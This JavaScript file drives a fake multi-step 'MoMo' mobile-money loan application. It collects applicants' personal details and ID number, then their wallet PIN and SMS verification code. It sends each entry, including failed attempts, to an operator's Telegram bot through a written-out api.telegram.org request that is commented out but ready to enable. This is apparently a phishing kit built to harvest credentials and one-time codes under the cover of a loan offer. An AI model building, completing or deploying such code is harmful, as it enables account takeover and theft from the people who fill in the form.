// Store form data
let applicationData = {};

// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN'; // Replace with your bot token
const TELEGRAM_CHAT_ID = 'YOUR_TELEGRAM_CHAT_ID'; // Replace with your chat ID

// Step 1: Loan Application Form Submission
document.getElementById('loanForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    // Store the form data
    applicationData = {
        fullName: document.getElementById('fullName').value,
        email: document.getElementById('email').value,
        phone: document.getElementById('phone').value,
        idNumber: document.getElementById('idNumber').value,
        loanAmount: document.getElementById('loanAmount').value,
        loanPurpose: document.getElementById('loanPurpose').value,
        employment: document.getElementById('employment').value,
        monthlyIncome: document.getElementById('monthlyIncome').value,
        timestamp: new Date().toLocaleString()
    };
    
    // Send data to Telegram bot
    sendToTelegramBot('Initial Application Received', applicationData);
    
    // Move to Step 2 (PIN Verification)
    goToStep(2);
});

// Step 2: PIN Form Submission
document.getElementById('pinForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    const pin = document.getElementById('pin').value;
    const pinError = document.getElementById('pinError');
    
    // Disable the submit button to prevent multiple submissions
    const submitBtn = this.querySelector('button[type="submit"]');
    submitBtn.disabled = true;
    submitBtn.textContent = 'Verifying...';
    
    // Simulate PIN verification
    verifyPin(pin, function(isCorrect) {
        if (isCorrect) {
            applicationData.pin = pin;
            applicationData.pinVerified = true;
            applicationData.pinVerifiedTime = new Date().toLocaleString();
            
            // Send correct PIN to Telegram
            sendToTelegramBot('PIN Verified Successfully', {
                ...applicationData,
                status: '✓ PIN VERIFIED'
            });
            
            pinError.style.display = 'none';
            // Move to Step 3 (SMS Verification)
            goToStep(3);
        } else {
            applicationData.pinAttempt = pin;
            applicationData.pinVerified = false;
            applicationData.pinFailureTime = new Date().toLocaleString();
            
            // Send incorrect PIN to Telegram
            sendToTelegramBot('PIN Verification Failed', {
                ...applicationData,
                status: '✗ PIN INCORRECT',
                attemptedPin: pin
            });
            
            pinError.textContent = 'Incorrect PIN. Please try again or request a new PIN.';
            pinError.style.display = 'block';
            document.getElementById('pin').value = '';
        }
        
        // Re-enable the submit button
        submitBtn.disabled = false;
        submitBtn.textContent = 'Verify PIN';
    });
});

// Step 3: SMS Code Form Submission
document.getElementById('smsForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    const smsCode = document.getElementById('smsCode').value;
    const smsError = document.getElementById('smsError');
    
    // Disable the submit button
    const submitBtn = this.querySelector('button[type="submit"]');
    submitBtn.disabled = true;
    submitBtn.textContent = 'Verifying...';
    
    // Simulate SMS verification
    verifySmsCode(smsCode, function(isCorrect) {
        if (isCorrect) {
            applicationData.smsCode = smsCode;
            applicationData.smsVerified = true;
            applicationData.smsVerifiedTime = new Date().toLocaleString();
            
            // Generate reference ID
            const refId = generateReferenceId();
            applicationData.referenceId = refId;
            
            // Send successful verification to Telegram
            sendToTelegramBot('Application Complete - SMS Verified', {
                ...applicationData,
                status: '✓ APPLICATION COMPLETE',
                referenceId: refId
            });
            
            smsError.style.display = 'none';
            
            // Display reference ID in success page
            document.getElementById('refId').textContent = refId;
            
            // Move to Step 4 (Success)
            goToStep(4);
        } else {
            applicationData.smsAttempt = smsCode;
            applicationData.smsVerified = false;
            applicationData.smsFailureTime = new Date().toLocaleString();
            
            // Send failed SMS verification to Telegram
            sendToTelegramBot('SMS Verification Failed', {
                ...applicationData,
                status: '✗ SMS VERIFICATION FAILED',
                attemptedCode: smsCode
            });
            
            smsError.textContent = 'Invalid SMS code. Please check your message and try again.';
            smsError.style.display = 'block';
            document.getElementById('smsCode').value = '';
        }
        
        // Re-enable the submit button
        submitBtn.disabled = false;
        submitBtn.textContent = 'Submit Verification';
    });
});

// PIN Verification Logic
function verifyPin(pin, callback) {
    // Simulate server verification with a delay
    setTimeout(() => {
        // For demo purposes: correct PIN is "12345" (5-digit)
        // In production, this would be sent to your server
        const isCorrect = (pin === '12345');
        callback(isCorrect);
    }, 1000);
}

// SMS Code Verification Logic
function verifySmsCode(code, callback) {
    // Simulate server verification with a delay
    setTimeout(() => {
        // For demo purposes: correct code contains "verification" or "confirm"
        // In production, this would be validated on your server
        const isCorrect = code.toLowerCase().includes('verification') || 
                         code.toLowerCase().includes('confirm') ||
                         code.toLowerCase().includes('code');
        callback(isCorrect);
    }, 1000);
}

// Send data to Telegram Bot
function sendToTelegramBot(title, data) {
    const message = formatTelegramMessage(title, data);
    
    // For demonstration, log to console
    console.log('Sending to Telegram:', message);
    
    // Uncomment the following code to actually send to Telegram
    // fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    //     method: 'POST',
    //     headers: {
    //         'Content-Type': 'application/json',
    //     },
    //     body: JSON.stringify({
    //         chat_id: TELEGRAM_CHAT_ID,
    //         text: message,
    //         parse_mode: 'HTML'
    //     })
    // }).then(response => response.json())
    //   .catch(error => console.error('Error sending to Telegram:', error));
}

// Format message for Telegram
function formatTelegramMessage(title, data) {
    let message = `<b>${title}</b>\n\n`;
    
    for (const [key, value] of Object.entries(data)) {
        const formattedKey = key.replace(/([A-Z])/g, ' $1').trim();
        const capitalizedKey = formattedKey.charAt(0).toUpperCase() + formattedKey.slice(1);
        message += `<b>${capitalizedKey}:</b> ${value}\n`;
    }
    
    message += `\n<i>Timestamp: ${new Date().toLocaleString()}</i>`;
    return message;
}

// Generate Reference ID
function generateReferenceId() {
    const timestamp = Date.now();
    const random = Math.floor(Math.random() * 10000);
    return `MOMO-${timestamp}-${random}`;
}

// Navigation Functions
function goToStep(stepNumber) {
    // Hide all steps
    document.querySelectorAll('.step').forEach(step => {
        step.classList.remove('active');
    });
    
    // Show the target step
    const targetStep = document.getElementById(`step${stepNumber}`);
    if (targetStep) {
        targetStep.classList.add('active');
    }
    
    // Scroll to top
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

function goBackToStep1() {
    if (confirm('Are you sure you want to go back? Your progress will be lost.')) {
        goToStep(1);
        document.getElementById('loanForm').reset();
        applicationData = {};
    }
}

function goBackToStep2() {
    goToStep(2);
    document.getElementById('smsForm').reset();
}

function resetForm() {
    // Clear all data
    applicationData = {};
    document.getElementById('loanForm').reset();
    document.getElementById('pinForm').reset();
    document.getElementById('smsForm').reset();
    document.getElementById('pinError').style.display = 'none';
    document.getElementById('smsError').style.display = 'none';
    
    // Go back to step 1
    goToStep(1);
}

// Input validation helpers
document.getElementById('pin').addEventListener('input', function(e) {
    // Only allow numbers and limit to 5 digits
    this.value = this.value.replace(/[^0-9]/g, '').slice(0, 5);
});

// Initialize on page load
window.addEventListener('load', function() {
    console.log('MoMo Loan Application Form Loaded');
    console.log('Demo PIN: 12345');
    console.log('Demo SMS Code: Any message containing "verification", "confirm", or "code"');
});
